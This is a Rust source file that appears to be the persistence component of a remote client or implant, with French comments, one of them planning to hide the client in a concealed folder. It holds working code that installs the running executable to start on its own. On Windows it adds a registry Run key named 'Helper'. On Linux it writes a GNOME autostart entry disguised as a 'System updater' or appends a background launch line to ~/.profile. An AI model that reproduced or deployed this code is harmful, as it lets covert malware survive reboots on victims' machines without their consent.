use anyhow::Result;
use std::env;
use std::fs::{self, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;

//TODO Ajouter la copie du client dans un dossier caché

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[cfg(target_os = "windows")]
pub fn add_to_registry() -> std::io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    let (key, _) = hkcu.create_subkey(path)?;

    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();

    let existing: Result<String, _> = key.get_value("Helper");
    if let Ok(val) = existing {
        if val == exe_path {
            return Ok(());
        }
    }

    key.set_value("Helper", &exe_path)?;
    Ok(())
}

pub fn add_to_autostart_gui() -> std::io::Result<()> {
    let autostart_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from(format!("{}/.config", env::var("HOME").unwrap())))
        .join("autostart");
    fs::create_dir_all(&autostart_dir)?;

    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
    let desktop_file = autostart_dir.join("helper.desktop");

    let content = format!(
        "[Desktop Entry]
        Type=Application
        Exec={}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        Name=Updater
        Comment=System updater
        ",
        exe_path
    );

    fs::write(desktop_file, content)?;
    Ok(())
}

pub fn add_to_profile_terminal() -> Result<()> {
    let home = env::var("HOME")?;
    let profile_path = PathBuf::from(format!("{}/.profile", home));

    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
    let line = format!("{} &", exe_path);

    if profile_path.exists() {
        let file = fs::File::open(&profile_path)?;
        let reader = BufReader::new(file);
        for l in reader.lines() {
            if let Ok(content) = l {
                if content.contains(&exe_path) {
                    return Ok(());
                }
            }
        }
    }

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&profile_path)?;
    writeln!(file, "{}", line)?;
    Ok(())
}

fn has_gui() -> bool {
    env::var("XDG_SESSION_TYPE").is_ok()
        || env::var("DISPLAY").is_ok()
        || env::var("WAYLAND_DISPLAY").is_ok()
}

pub fn setup_persistence_linux() {
    if has_gui() {
        if let Err(e) = add_to_autostart_gui() {
            eprintln!("Erreur autostart GUI: {}", e);
        }
    } else {
        if let Err(e) = add_to_profile_terminal() {
            eprintln!("Erreur profile terminal: {}", e);
        }
    }
}
